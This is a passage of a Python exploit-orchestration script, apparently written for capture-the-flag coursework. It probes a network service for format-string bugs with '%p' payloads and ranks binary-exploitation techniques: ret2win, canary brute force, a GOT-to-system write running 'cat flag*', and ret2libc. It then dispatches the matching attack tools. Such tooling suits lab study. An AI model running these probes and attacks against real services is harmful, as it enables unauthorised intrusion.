#!/usr/bin/env python3
"""Authorised coursework; localhost clones; dummy flags.

solve.py - a THIN ROUTER over the tested tools. It contains NO exploit logic:
no offsets, no addresses, no magic values, no payload assembly, no flag parsing.
It gathers facts by calling the existing tools, ranks the taught shapes, and then
runs the matching tool, whose EXIT CODE is the source of truth.

    python3 solve.py HOST PORT [--binary ./b] [--source s.c] [--run]

Default is triage: print the ranked shapes and the exact command for each, run
nothing but the read-only probes. --run executes candidates in rank order, only
when confidence is HIGH.

Routing (all parameters are derived by the tools themselves, nothing hardcoded):
  fmt      -> auto_pwn.py --mode fmt --goal fmt-leak
  var      -> auto_pwn.py --goal var          (magic re-derived by auto_pwn)
  ret2win  -> auto_pwn.py --goal auto
  strcmp   -> auto_pwn.py --goal strcmp
  shell    -> verify.py (parse shift) then ret2shell.py [--shift=...]
  refuse   -> template + exit 3

Exit: 0 solved, 2 ran but no solve, 3 low confidence / refused / menu, 4 usage.
"""
import shlex
import argparse
import json
import os
import re
import socket
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
HEX_TOKEN = re.compile(rb"0x[0-9a-fA-F]{4,}")
MENU_LINE = re.compile(rb"^\s*[\[(]?\d+[\])\.]\s+\S", re.M)
MENU_WORD = re.compile(rb"choice|option|select|menu|\bchoose\b", re.I)


def tool(name):
    return os.path.join(HERE, name)


class Transcript:
    """Append-only record of every command and response, so a run is reviewable."""

    def __init__(self, path):
        self.path = path
        self.fh = open(path, "a", encoding="utf-8", errors="replace")
        self.fh.write(f"\n{'=' * 70}\n=== solve.py {time.strftime('%Y-%m-%d %H:%M:%S')}\n")

    def note(self, text):
        self.fh.write(text.rstrip() + "\n")
        self.fh.flush()

    def record(self, cmd, rc, out, elapsed):
        self.fh.write(f"\n--- $ {' '.join(cmd)}\n--- exit={rc} elapsed={elapsed:.1f}s\n")
        self.fh.write(out if isinstance(out, str) else out.decode("latin-1", "replace"))
        self.fh.write("\n")
        self.fh.flush()

    def close(self):
        try:
            self.fh.close()
        except Exception:
            pass


def run_tool(cmd, timeout, tr, label=""):
    """Run a child tool. Returns (rc, combined output). A timeout is a failure, not a crash."""
    t0 = time.time()
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=max(1.0, timeout))
        rc, out = p.returncode, (p.stdout or "") + (p.stderr or "")
    except subprocess.TimeoutExpired as exc:
        partial = (exc.stdout or b"") if isinstance(exc.stdout, bytes) else (exc.stdout or "")
        if isinstance(partial, bytes):
            partial = partial.decode("latin-1", "replace")
        rc, out = 124, partial + f"\n[!] timed out after {timeout:.0f}s"
    except OSError as exc:
        rc, out = 125, f"[!] cannot run {cmd[0]}: {exc}"
    tr.record(cmd, rc, out, time.time() - t0)
    return rc, out


# ---------------------------------------------------------------- recon (read-only)
def banner_past_gates(host, port, timeout=3.0, idle=0.6):
    """The banner a client sees AFTER answering any live gates.

    Everything triage decides - canary present, PIE leak, format bug, which addresses are
    code - comes from the banner. When a gate stands in front, the useful half of the
    banner (`canary = 0x...`, a leaked pointer, the real prompt) has not been printed yet,
    so triage judges the wrong text and never proposes the right technique. Only called
    when the first read actually looks like a gate, so ordinary targets pay nothing.
    """
    try:
        from auto_pwn import connect, recv_idle, pass_gates, answer_gate
    except Exception as exc:
        print(f"[!] BUG while loading the gate answerer: {type(exc).__name__}: {exc}")
        return None
    import types as _t
    a = _t.SimpleNamespace(host=host, port=port, timeout=timeout, idle=idle, gate_delay=0.25)
    try:
        s = connect(host, port, timeout)
    except OSError:
        return None
    try:
        text = recv_idle(s, timeout, idle)
        if answer_gate(text) is None:
            return None                      # not gated: nothing to look past
        text, _too_fast = pass_gates(s, a, text)
        return text
    except OSError:
        return None
    finally:
        s.close()


# Connections each brute-force shape needs, so its cost can be weighed against the time
# actually left. Measured, not guessed: canaryfork32 showed ~256 tries per canary byte,
# pieblind32 ~128 rolls, and the crash oracle walks a binary search.
BANNER_COST = {}

BRUTE_COST = {
    "canary brute": 4 * 256,
    "PIE partial overwrite": 128,
    "partial": 128,
    "crash oracle": 64,
}


def brute_estimate(shape, conn_cost):
    """(connections, seconds) a brute-force shape will cost, or None if it is not one."""
    for key, conns in BRUTE_COST.items():
        if key in shape:
            return conns, conns * conn_cost
    return None


def read_banner(host, port, timeout=3.0, idle=0.6):
    """Connect, read whatever the service volunteers, send NOTHING.

    Records the time to the FIRST byte in BANNER_COST. Timing the whole read instead
    would add the trailing `idle` wait to every measurement - 0.6s of phantom cost, which
    on a 1024-connection brute estimate is ten imaginary minutes.
    """
    _started = time.time()
    try:
        s = socket.create_connection((host, port), timeout=timeout)
    except OSError as exc:
        return None, f"cannot connect: {exc}"
    out = b""
    first = None
    try:
        # Wait the FULL timeout for the first byte, then only `idle` between bytes.
        # Setting `idle` up front means a service that pauses before printing - a rate
        # limit, or setup work - is declared bannerless: slowcanary32 sleeps 1.2s and
        # triage saw "0 bytes", so it could not tell a canary from a silent socket.
        s.settimeout(timeout)
        while True:
            try:
                d = s.recv(4096)
                if not d:
                    break
                if first is None:
                    first = time.time() - _started
                out += d
                s.settimeout(idle)
            except socket.timeout:
                break
    finally:
        s.close()
    BANNER_COST["first_byte"] = first if first is not None else (time.time() - _started)
    return out, None


LINK = {"cost": 0.0}      # seconds one connection's first byte took; set once the banner is read


def send_once(host, port, data, timeout=3.0, idle=0.5, pre=b""):
    """One connection: read banner, optionally send `pre` first, send `data`, read.

    The wait for the FIRST byte of each reply is scaled to the link (LINK["cost"]); `idle`
    is only the gap allowed between chunks. With a fixed 0.5 s for both, a host 600 ms
    away never answered in time: the banner was "empty", a gate went unanswered, and the
    format-string probe reported no bug on a service it had not actually heard from."""
    first = max(idle, min(timeout, 2.5 * LINK["cost"] + 0.3))
    try:
        s = socket.create_connection((host, port), timeout=timeout)
    except OSError:
        return b""
    out = b""
    try:
        s.settimeout(first)
        try:
            out += s.recv(4096)
        except socket.timeout:
            pass
        # A live gate in front of the service must be answered before ANY probe means
        # anything: unanswered, the format-string probe lands on the gate's own read and
        # concludes "no format bug" about a program it never reached.
        try:
            import types
            from auto_pwn import answer_gate, pass_gates
            if out and answer_gate(out) is not None:
                out, _fast = pass_gates(s, types.SimpleNamespace(timeout=timeout, idle=idle,
                                                                 gate_delay=0.25), out)
                s.settimeout(idle)
        except Exception:
            pass
        if pre:
            s.sendall(pre)
            time.sleep(0.2)
            s.settimeout(first)
            try:
                out += s.recv(4096)
            except socket.timeout:
                pass
        s.sendall(data)
        s.settimeout(first)
        while True:
            try:
                d = s.recv(4096)
                if not d:
                    break
                out += d
                s.settimeout(idle)
            except socket.timeout:
                break
    except OSError:
        pass
    finally:
        s.close()
    return out


def menu_reason(banner):
    """Why we must NOT drive this service automatically. None = a normal prompt."""
    if banner is None:
        return "could not connect"
    if not banner.strip():
        return "service sent no banner (0 bytes): the input protocol is unknown"
    if len(MENU_LINE.findall(banner)) >= 2:
        return "banner looks like a numbered menu (>=2 option lines)"
    if MENU_WORD.search(banner):
        return "banner mentions a menu/choice prompt"
    return None


# Which prompt-step reached the format bug, if it was behind one. Remembered so the menu
# walk can start with that option: trying all four burned 100s of a 220s budget before any
# fmt-write candidate ran.
FMT_PRE = {}


def probe_fmt(host, port, tr, banner=b""):
    """Is user input used as a printf FORMAT string?

    Not "does the reply contain hex" - a normal program may print pointers of its own
    (buff32 prints two). The signal is SCALING: a real printf(user_input) leaks one
    word per specifier, so 12 specifiers yield more distinct hex words than 4.
    """
    def scale(pre):
        r4 = send_once(host, port, b"%p.%p.%p.%p\n", pre=pre)
        r12 = send_once(host, port, b"%p." * 12 + b"\n", pre=pre)
        return len(set(HEX_TOKEN.findall(r4))), len(set(HEX_TOKEN.findall(r12)))

    c4, c12 = scale(b"")
    tr.note(f"[fmt probe] distinct hex words: 4 specifiers -> {c4}, 12 specifiers -> {c12}")
    if c12 > c4 and c12 >= 3:
        return True, c4, c12
    # The bug may not be the FIRST input (live GOT-style challenges read a command, then
    # the format string). Step past one prompt and probe again before concluding "no".
    #
    # Which line to step with matters: "x" works for a free-text prompt but a MENU treats
    # an unknown choice as quit, so the probe killed the service and concluded "no format
    # bug" on menufmt32 - where printf(buf) sits inside option 2. Walk the real options.
    pres = [b"x\n"]
    if len(MENU_LINE.findall(banner or b"")) >= 2:
        pres = [b"%d\n" % o for o in range(1, 5)] + [b"x\n"]
    for pre in pres:
        d4, d12 = scale(pre)
        tr.note(f"[fmt probe] after pre={pre!r}: 4 -> {d4}, 12 -> {d12}")
        if d12 > d4 and d12 >= 3:
            print(f"[*] format-string bug found behind one prompt (pre={pre!r}): "
                  f"needs --talk / --pre")
            FMT_PRE["pre"] = pre.decode("latin-1").strip()
            return True, d4, d12
    return False, c4, c12


# ---------------------------------------------------------------- static facts
def elf_facts(binary, tr, timeout):
    rc, out = run_tool([sys.executable, tool("elftool.py"), binary, "--json"], timeout, tr)
    if rc != 0:
        return {}
    try:
        return json.loads(out[out.index("{"):])
    except (ValueError, json.JSONDecodeError):
        return {}


def src_facts(source, tr, timeout):
    rc, out = run_tool([sys.executable, tool("analyze.py"), source, "--json"], timeout, tr)
    if rc != 0:
        return {}
    try:
        data = json.loads(out[out.index("["):]) if out.lstrip().startswith("[") else json.loads(out[out.index("{"):])
    except (ValueError, json.JSONDecodeError):
        return {}
    return data[0] if isinstance(data, list) and data else (data if isinstance(data, dict) else {})


def image_span(elf):
    """Lowest..highest address the binary itself occupies, used only to tell a POINTER
    immediate (cmp against a GOT/.bss slot - every C program has these) from a MAGIC
    guard constant. Ranking only; auto_pwn re-derives the real value when it runs."""
    addrs = []
    for key in ("functions", "plt", "got"):
        addrs += [v for v in (elf.get(key) or {}).values() if isinstance(v, int)]
    for item in elf.get("writable") or []:
        if isinstance(item, (list, tuple)) and len(item) >= 3:
            addrs += [item[1], item[2]]
    if not addrs:
        return None
    return min(addrs), max(addrs)


def magic_guards(args, elf, tr, timeout):
    """Guard constants: `cmp ...,0xIMM` in the binary and/or `== 0x...` in the source.

    Source matters: live 5001 ships only chall.c, and its guard 0x1337c0de exists
    nowhere else - without this the var shape is never ranked."""
    where = (["--binary", args.binary] if args.binary else []) + \
            (["--source", args.source] if args.source else [])
    rc, out = run_tool([sys.executable, tool("auto_pwn.py"), "--host", "127.0.0.1", "--port", "1"]
                       + where + ["--goal", "var", "--dry-run"], timeout, tr)
    m = re.search(r"values=\[([^\]]*)\]\s*\(([^)]*)\)", out)
    if not m or "none found" in m.group(2):
        return []
    from_source = "source" in m.group(2)
    vals = []
    for tok in re.findall(r"0x[0-9a-fA-F]+", m.group(1)):
        try:
            vals.append(int(tok, 16))
        except ValueError:
            pass
    span = image_span(elf)
    if from_source or not span:
        return vals          # source literals are real constants, not GOT pointers
    lo, hi = span
    return [v for v in vals if v < lo or v > hi]


# ---------------------------------------------------------------- ranking
def fmt_pre_args():
    """`--pre` steps needed to reach the format bug, if it sits behind a prompt.

    probe_fmt already discovered which line gets there (menu option 2 on menufmt32); the
    write candidates have to walk the same path or the payload lands on the menu read
    instead of the vulnerable one.
    """
    pre = FMT_PRE.get("pre")
    return ["--pre", pre] if pre else []


def build_candidates(args, elf, src, fmt_yes, magics, banner):
    """Ranked shapes. Each candidate carries the exact command; none carries a payload."""
    arch = []
    bits = elf.get("bits")
    if bits == 64:
        arch = ["--arch", "amd64"]
    elif src.get("bits") == 64:
        arch = ["--arch", "amd64"]
    target = ["--host", args.host, "--port", str(args.port)]
    where = (["--binary", args.binary] if args.binary else []) + (["--source", args.source] if args.source else [])
    flagre = ["--flag-regex", args.flag_regex] if args.flag_regex else []
    ap = [sys.executable, tool("auto_pwn.py")] + target + where + flagre
    cands = []

    src_is_fmt = "fmt" in (src.get("class") or "")
    if fmt_yes or src_is_fmt:
        why = "input is used as a printf format string (" + \
              ("%p scaling probe" if fmt_yes else "source: printf(variable)") + ")"
        # The full engine first: it finds the argument slot and word size itself, then
        # tries every taught format-string shape (stack read, %s through a stack pointer,
        # %s at a global's address, %hn to a guard, GOT -> win, leak-then-overflow). The
        # two auto_pwn probes below stay as a second opinion - they need no binary and
        # cover a stack-resident flag by a different route.
        cands.append({"shape": "fmt engine (read / %n write / GOT / leak-then-overflow)",
                      "why": why + "; slot, width, targets and values derived, not typed",
                      "cmd": [sys.executable, tool("fmtpwn.py"), args.host, str(args.port)]
                             + (["--binary", args.binary] if args.binary else [])
                             + flagre + fmt_pre_args() + ["--budget", "AUTO"]})
        cands.append({"shape": "fmt-leak", "why": why,
                      "cmd": ap + ["--mode", "fmt", "--goal", "fmt-leak"] + arch})
        # A format-string bug can also be a WRITE. The blind probe solves "set this
        # variable to anything" challenges; a targeted write needs fmtwrite.py, which
        # the template below spells out with the real GOT address.
        cands.append({"shape": "fmt-write", "why": why + "; trying %n writes",
                      "cmd": ap + ["--mode", "fmt", "--goal", "fmt-write"] + arch})

    # Guards read off the stack frame itself: offset, width and value known together, so
    # this is one connection per plan and needs no guard constant >= 0x100 to exist. It
    # is what finds `if (authenticated)`, `if (level == 1)`, a char guard, a two-field
    # guard, a neighbouring string compared with strcmp, and a neighbouring command
    # buffer handed to system().
    if args.binary or args.source:
        fplans = []
        try:
            from auto_pwn import frame_guard_plans, source_guard_plans
            if args.binary:
                fplans = frame_guard_plans(args.binary)
            if args.source:
                # Source only is how live 5001 shipped: a struct's layout is fixed by the
                # language, so the offsets are exact without any binary.
                fplans += source_guard_plans(args.source, bits or 32)
            # A guard compared with a value the service announces per connection has no
            # static plan at all - it still counts as a lead.
            fplans += [(d[0], b"") for d in getattr(frame_guard_plans, "dynamic", []) if args.binary]
            fplans += [(d[0], b"") for d in getattr(source_guard_plans, "dynamic", []) if args.source]
        except Exception as exc:
            print(f"[!] BUG while reading frame guards: {type(exc).__name__}: {exc}")
        if fplans:
            cands.append({"shape": "var/struct (frame guards)",
                          "why": f"{len(fplans)} overflow plan(s) read from the frame, e.g. "
                                 + fplans[0][0][:90],
                          "cmd": ap + ["--goal", "var", "--frame-only"] + arch})

    # var ABOVE ret2win when a non-pointer guard constant exists: a win symbol may be
    # reachable only through that guard, so do not gamble on a return-address overwrite.
    if magics:
        cands.append({"shape": "var/struct", "why": "guard compares against non-pointer constant(s) "
                                                    + ", ".join(hex(v) for v in magics[:4]),
                      "cmd": ap + ["--goal", "var"] + arch})

    wins = elf.get("win_symbols") or {}
    gset = elf.get("gadgets") or {}
    # win() + a non-pointer constant + an argument-setting gadget is the win(key)
    # signature. Without this the constant looks like a `var` guard and the real shape
    # ranks far too low to get a useful share of the budget.
    if wins and magics and (gset.get("pop rdi; ret") or elf.get("bits") == 32):
        cands.append({"shape": "ret2win with argument",
                      "why": f"win symbol + non-pointer constant {hex(magics[0])} + arg gadget",
                      "cmd": ap + ["--goal", "ret2win", "--win-arg", hex(magics[0])] + arch})
    # win(char *key): the argument must be a POINTER to a literal that already exists in
    # .rodata, not an integer. win()'s own code references it, so the address is read from
    # the disassembly. Try the first few in first-seen order - the compared literal comes
    # first, because win() checks it before printing its error message.
    try:
        from auto_pwn import extract_win_ptr_args
        pargs = extract_win_ptr_args(args.binary) if args.binary else []
    except Exception as exc:
        print(f"[!] BUG while reading win() string args: {type(exc).__name__}: {exc}")
        pargs = []
    if pargs and (elf.get("plt") or {}).get("strcmp") and (elf.get("win_symbols") or {}):
        for pa in pargs[:3]:
            cands.append({
                "shape": f"ret2win with a string-pointer argument ({hex(pa)})",
                "why": "win() strcmp's a literal: pass its .rodata address, not an integer",
                "cmd": ap + ["--goal", "ret2win", "--win-arg", hex(pa)] + arch})

    # win(a, b): the guard constants inside win(), in argument order. 64-bit builds compile
    # these to mov+cmp rather than cmp-imm, so they come from the win body, not extract_magic.
    try:
        from auto_pwn import extract_win_args
        wargs = extract_win_args(args.binary) if args.binary else []
    except Exception as exc:
        print(f"[!] BUG while reading win() guard constants: {type(exc).__name__}: {exc}")
        wargs = []
    # Pass as many as were found, not a fixed two: SysV-64 threads three integer args
    # through rdi/rsi/rdx. Try the widest first and fall back, since the last constant is
    # not always an argument.
    if len(wargs) >= 2 and (elf.get("win_symbols") or {}):
        for n in range(min(len(wargs), 3), 1, -1):
            flags = []
            for v in wargs[:n]:
                flags += ["--win-arg", hex(v)]
            cands.insert(0, {
                "shape": f"ret2win with {('two', 'three')[n - 2]} arguments",
                "why": "win() checks " + ", ".join(hex(v) for v in wargs[:n])
                       + f": needs a {n}-pop chain",
                "cmd": ap + ["--goal", "ret2win"] + flags + arch})
    # A canary only stops you if you cannot read it. If the service prints one, it can
    # be written back in place and the overflow continues to the return address.
    # Behind a menu the canary may be printed only inside an option, so the banner alone
    # cannot rule it out. Offer the candidate anyway when the binary HAS a canary and a
    # menu is in the way: auto_pwn's probe walks the scripted conversation and confirms
    # the leak live, or the attempt simply fails. Without this the candidate never exists
    # and only the exhaustive battery can win - 24s instead of a few.
    canary_leaked = bool(re.search(rb"canary", banner or b"", re.I))
    # Derived here rather than passed in: this function only has the banner.
    menu_in_way = len(MENU_LINE.findall(banner or b"")) >= 2
    # A login hides the rest of the banner exactly as a menu does: logincanary32 prints
    # its canary only after the credentials are accepted, so the banner alone cannot rule
    # a canary out. Same reasoning, same fix - otherwise only the exhaustive battery wins
    # (69s there, where the ranked candidate takes a few).
    cred_in_way = bool(CRED_PROMPT.search(_last_line(
        (banner or b"").decode("latin-1", "replace"))))
    hidden_banner = menu_in_way or cred_in_way
    if wins and elf.get("canary") and (canary_leaked or hidden_banner):
        cands.append({"shape": "ret2win (canary leaked)",
                      "why": ("stack canary present, but the service leaks it -> write it back"
                              if canary_leaked else
                              "canary present and a menu hides the banner -> look for the "
                              "leak behind the menu"),
                      "cmd": ap + ["--goal", "ret2win"] + arch})
    # PIE is solvable when the service leaks a code pointer: the load base follows.
    if wins and elf.get("pie") and not elf.get("canary") and (
            HEX_TOKEN.search(banner or b"") or hidden_banner):
        cands.append({"shape": "ret2win (PIE rebase)",
                      "why": "PIE, but a code pointer is leaked -> load base is recoverable",
                      "cmd": ap + ["--goal", "ret2win"] + arch})
    # Whether the banner leaks a CODE pointer, judged against the binary's own executable
    # ranges rather than the usual link bases - an unusual base or a 0x55.. PIE mapping
    # would otherwise be missed.
    try:
        from auto_pwn import looks_like_code
        leaks = any(looks_like_code(a, args.binary)
                    for a in (int(t, 16) for t in HEX_TOKEN.findall(banner or b"")))
    except Exception as exc:
        print(f"[!] BUG while classifying banner leaks: {type(exc).__name__}: {exc}")
        leaks = any(0x08000000 <= a <= 0x08FFFFFF or 0x400000 <= a <= 0xFFFFFF
                    for a in (int(t, 16) for t in HEX_TOKEN.findall(banner or b"")))
    if wins and not elf.get("pie") and not elf.get("canary"):
        cands.append({"shape": "ret2win", "why": "win-like symbol at a fixed address: "
                                                 + ", ".join(sorted(wins)[:3]),
                      "cmd": ap + ["--goal", "auto"] + arch})
        # If the scan failed, the service may be rate-limited: one cyclic pattern finds
        # the offset in a single connection instead of up to 127 of them.
        cands.append({"shape": "ret2win (cyclic)", "why": "retry: offset from one cyclic pattern",
                      "cmd": ap + ["--goal", "ret2win", "--cyclic"] + arch})
        # Nothing leaked and the scan missed? Survival alone still gives the offset.
        cands.append({"shape": "ret2win (crash oracle)",
                      "why": "last resort: binary-search the offset from crash vs clean exit",
                      "cmd": ap + ["--goal", "ret2win", "--crash-oracle"] + arch})
    elif not args.binary and leaks:
        # A win() in the source is NOT enough: with no binary and no leaked code address
        # there is nothing to jump to, and the attempt can only fail (live 5001).
        cands.append({"shape": "ret2win", "why": "no binary, but the banner leaks a code address",
                      "cmd": ap + ["--goal", "ret2win"] + arch})

    # win(key) where the key is announced per connection: the plain ret2win run handles it
    # first thing, so put that run AHEAD of the constant-argument guesses, which would
    # otherwise each burn a full cap on a key that is different every time.
    try:
        from auto_pwn import win_wants_runtime_arg
        if args.binary and wins and win_wants_runtime_arg(args.binary):
            cands.insert(0, {"shape": "ret2win with the argument the service announces",
                             "why": "win() compares its argument with a run-time value",
                             "cmd": ap + ["--goal", "ret2win", "--max-attempts", "40"] + arch,
                             "rank": (-1, 0)})
    except Exception as exc:
        print(f"[!] BUG while checking for a run-time win() argument: {type(exc).__name__}: {exc}")

    # GOT -> system with no value for you to choose: the banner gives system(), elftool
    # gives the GOT slot, and the command to run is the obvious one.
    sysm = re.search(rb"system[^0-9]{0,24}(0x[0-9a-fA-F]+)", banner or b"", re.I)
    gotd = elf.get("got") or {}
    if (fmt_yes or "fmt" in (src.get("class") or "")) and sysm and gotd and elf.get("relro") != "full":
        slot = gotd.get("puts") or gotd.get("printf") or sorted(gotd.values())[0]
        cands.append({
            "shape": "fmt-write GOT->system",
            "why": f"format-string bug + writable GOT + system() leaked at "
                   f"{sysm.group(1).decode()}",
            "cmd": [sys.executable, tool("fmtwrite.py"), args.host, str(args.port),
                    "--addr", hex(slot),
                    "--value-regex", r"system[^0-9]{0,24}(0x[0-9a-fA-F]+)",
                    "--pre", "cat flag* flags/* 2>/dev/null"]})

    # Last resorts. Both are brute force, so they rank below everything else.
    if wins and elf.get("pie") and not HEX_TOKEN.search(banner or b"") and not elf.get("canary"):
        cands.append({"shape": "ret2win (PIE partial overwrite)",
                      "why": "PIE with nothing leaked: overwrite 2 bytes, brute the 1 unknown nibble",
                      "cmd": ap + ["--goal", "ret2win", "--partial", "--send-mode", "raw"] + arch})
    if wins and elf.get("canary") and not re.search(rb"canary", banner or b"", re.I):
        cands.append({"shape": "ret2win (canary brute)",
                      "why": "canary not leaked: recover it byte by byte (needs a forking service)",
                      "cmd": ap + ["--goal", "ret2win", "--brute-canary", "--send-mode", "raw",
                                   "--idle", "0.05", "--timeout", "1.0", "--max-attempts", "400"] + arch})

    # A format-string bug plus a leaked WRITABLE address (stack or .data) is the
    # "corrupt the guard" shape: a check like `if (i != 0xdeadbeef)` only needs the
    # value to CHANGE, so writing anything over it wins. The address is ASLR'd, so the
    # command carries a regex anchored on the surrounding text rather than the value.
    if fmt_yes or "fmt" in (src.get("class") or ""):
        btxt = (banner or b"").decode("latin-1", "replace")
        wr = elf.get("writable") or []
        for m in re.finditer(r"0x[0-9a-fA-F]+", btxt):
            v = int(m.group(0), 16)
            # A stack pointer: high in the address space and NOT in the binary's own
            # ranges. Derived rather than assumed, so an unusual mapping still classifies.
            stacky = (v >= 0xFF000000 or v >= 0x7FF000000000) and not any(
                lo <= v < hi for _n, lo, hi in wr if isinstance(lo, int))
            datay = any(lo <= v < hi for _n, lo, hi in wr if isinstance(lo, int))
            if not (stacky or datay):
                continue
            ctx = btxt[max(0, m.start() - 12):m.start()]
            if not ctx.strip():
                continue
            areg = re.escape(ctx) + r"(0x[0-9a-fA-F]+)"
            base = [sys.executable, tool("fmtwrite.py"), args.host, str(args.port),
                    "--addr-regex", areg]
            # A target in .data/.bss is almost always a FUNCTION POINTER - overwrite it
            # with win(). A target on the STACK is a local guard, which only has to
            # change. Emit both, best-guess first, so a wrong hint costs one cap and not
            # the solve.
            win_addr = None
            for _nm, _a in (elf.get("win_symbols") or {}).items():
                if isinstance(_a, int) and _a:
                    win_addr = _a
                    break
            ptr_first = [{
                "shape": "fmt-write win() over a leaked function pointer",
                "why": f"fmt bug + writable .data pointer {m.group(0)} in the banner"
                       + (f" + win at {hex(win_addr)}" if win_addr else ""),
                "cmd": base + ["--value", hex(win_addr), "--half", "low"]}] if win_addr else []
            guard_first = [{
                "shape": "fmt-write to a leaked address (change the guard)",
                "why": f"fmt bug + writable address {m.group(0)} in the banner",
                "cmd": base + ["--value", "any"]}]
            # A guard constant from the binary (`target == 0xDEADBEEF`) plus a writable
            # address from the banner is an EXACT write, not "change it to anything".
            # Without this, fmtwrite32 and menufmt32 had no candidate that could win:
            # --value any writes the character count, and --value <win> writes a code
            # address, neither of which equals the magic the program compares against.
            magic_first = [{
                "shape": f"fmt-write {hex(mv)} to a leaked address",
                "why": f"fmt bug + writable address {m.group(0)} + guard constant "
                       f"{hex(mv)} from the binary",
                "cmd": base + ["--value", hex(mv)]} for mv in (magics or [])[:2]]
            cands.extend(magic_first
                         + ((ptr_first + guard_first) if datay
                            else (guard_first + ptr_first)))
            break

    # A writable global at a FIXED address (non-PIE) plus a guard constant from the
    # binary needs no leak at all. This is the only route when the address is printed
    # somewhere the banner never shows - menufmt32 prints it inside menu option 2, so
    # every leak-based candidate was impossible there.
    if (fmt_yes or "fmt" in (src.get("class") or "")) and not elf.get("pie"):
        for gname, gaddr in list((elf.get("data_symbols") or {}).items())[:3]:
            for mv in (magics or [])[:2]:
                cands.append({
                    "shape": f"fmt-write {hex(mv)} to {gname}",
                    "why": f"fmt bug + writable global {gname} at {hex(gaddr)} (symbol "
                           f"table, no leak needed) + guard constant {hex(mv)}",
                    "cmd": [sys.executable, tool("fmtwrite.py"), args.host, str(args.port),
                            "--addr", hex(gaddr), "--value", hex(mv)] + fmt_pre_args()})

    for item in (src.get("goals", {}) or {}).get("strcmp") or []:
        cands.append({"shape": "strcmp", "why": f"source: buffer must equal {item.get('literal')!r}",
                      "cmd": ap + ["--goal", "strcmp"]})
        break
    else:
        # No source? The PLT still says whether the program calls strcmp at all, and
        # auto_pwn can now pull the candidate literals out of .rodata itself.
        if (elf.get("plt") or {}).get("strcmp"):
            cands.append({"shape": "strcmp", "why": "binary imports strcmp; literals from .rodata",
                          "cmd": ap + ["--goal", "strcmp"]})

    # The win(key) signature is strictly more specific than "a guard constant exists",
    # so it must outrank var - otherwise a ret2win(arg) target spends its budget on var.
    # Order: most specific shape first, then other primary shapes, then last-resort
    # retries. Retry variants (cyclic / crash-oracle / partial / brute) are expensive and
    # must not consume the budget ahead of a distinct shape nobody has tried yet - that
    # is how a strcmp target spent 75s on ret2win retries before reaching strcmp.
    # Rank by STRENGTH OF EVIDENCE, not by shape alone. A format-string bug the probe
    # actually confirmed, or a strcmp the binary actually imports, is hard evidence; a
    # plain ret2win is a guessed offset against a plausible symbol. Trying hard evidence
    # first cut got32 and simple_strcmp32 from tens of seconds to a few.
    btxt_r = (banner or b"").decode("latin-1", "replace")
    libc_leak = ((elf.get("relro") or "none") != "full") and bool(
        re.search(r"0x(f7|f6)[0-9a-fA-F]{6}\b", btxt_r))
    RETRY = ("cyclic", "crash oracle", "partial", "brute")
    has_strcmp = bool((elf.get("plt") or {}).get("strcmp"))
    def rank(c):
        sh = c["shape"]
        # Any argument-passing ret2win is derived from hard evidence (a guard constant or a
        # literal address read out of win() itself), so all of them rank first. Matching the
        # old exact string silently demoted the two-argument and string-pointer shapes
        # behind weaker candidates - twoarg64 went 2s -> 27s.
        if sh.startswith("ret2win with the argument the service announces"):
            return (-1, 0)
        if sh.startswith("ret2win with"):
            return (0, 0)
        if any(k in sh for k in RETRY):
            return (3, 0)
        if fmt_yes and ("fmt" in sh or "format" in sh):
            # A banner that hands out a libc-range pointer, on a binary whose GOT is
            # writable, is the GOT->system chain advertising itself: try it before the
            # generic leak/write probes, which otherwise burn a full cap each. Keyed on
            # real evidence so a pure-leak challenge (no such pointer) is untouched.
            if libc_leak and "GOT->system" in sh:
                return (0, 0)
            if "leaked" in sh:
                return (0, 0)     # a writable address the banner actually handed over
            # "fmt-write <magic> to <global>" comes from two facts read out of the binary:
            # a guard constant, and a writable global's address from the symbol table. No
            # leak, no guess - the same tier as an imported strcmp. Placed INSIDE this
            # branch because the fmt branch returns first; a copy below it was dead code,
            # which is why menufmt32 stayed at 112s behind four fmt-leak attempts.
            if sh.startswith("fmt-write 0x") and " to " in sh:
                return (0, 0)
            # The engine: behind anything the banner handed over outright, ahead of the
            # two blind probes (which spend a full cap each when they miss).
            # A format bug the probe CONFIRMED on the wire outranks an imported strcmp or a
            # guessed frame guard, so with a clean banner it goes first (it is first in
            # the list, and ties keep insertion order). A banner that already prints an
            # address is the older tools' ground - let those go ahead of it.
            if sh.startswith("fmt engine"):
                return (0, 0.5) if HEX_TOKEN.search(banner or b"") else (0, 0)
            return (0, 1)
        if has_strcmp and "strcmp" in sh:
            return (0, 0)
        if sh.startswith("var/struct (frame guards)"):
            return (0, 0)      # read from the code, and each plan costs one connection
        # A leaked canary or a leaked code pointer is evidence we have SEEN, exactly like
        # a confirmed fmt bug: the value is in the banner. These were landing in the
        # "merely plausible" tier, so on a menu target the ranked candidate was not
        # menu-wrapped and only the exhaustive battery found the flag.
        if "canary leaked" in sh or "PIE rebase" in sh:
            return (0, 0)
        return (2, 0)
    cands.sort(key=rank)
    for c in cands:
        c["rank"] = rank(c)        # kept so later walkers can respect the evidence tier
    # NX on, nothing to jump to, no format bug: that is the ret2libc case, not a dead end.
    if args.binary and elf.get("nx") and not wins and (elf.get("plt") or {}).get("puts") \
            and not elf.get("pie"):
        libc_cmd = [sys.executable, tool("ret2libc.py"), args.host, str(args.port),
                    "--binary", args.binary]
        cands.append({"shape": "ret2libc",
                      "why": "NX on, no win symbol, puts in the PLT -> leak libc, call system",
                      "cmd": list(libc_cmd)})
        # ret2libc is the ONLY two-stage chain here: stage 1 returns into main, which
        # re-prints whatever stands in front of the bug, so stage 2 lands on that prompt.
        # ret2libc.py takes --pre and walks it before BOTH stages. The menu walker cannot
        # help: it speaks --talk, which ret2libc.py does not take.
        if hidden_banner:
            known = FMT_PRE.get("pre")
            opts = [known] if (known and known.isdigit()) else []
            opts += [str(o) for o in range(1, 4) if str(o) != known]
            for opt in opts[:3]:
                cands.append({"shape": f"ret2libc behind prompt {opt}",
                              "why": f"NX on, no win symbol, and an obstacle in front: "
                                     f"walk {opt} before each stage",
                              "cmd": list(libc_cmd) + ["--pre", opt]})
    if args.binary and elf.get("nx") is False and (elf.get("gadgets") or {}).get("jmp esp" if bits == 32 else "jmp rsp"):
        cands.append({"shape": "ret2shellcode", "why": "executable stack + a jmp esp/rsp gadget, no win symbol",
                      "cmd": None, "shell": True})
    elif args.binary and elf.get("nx") is False:
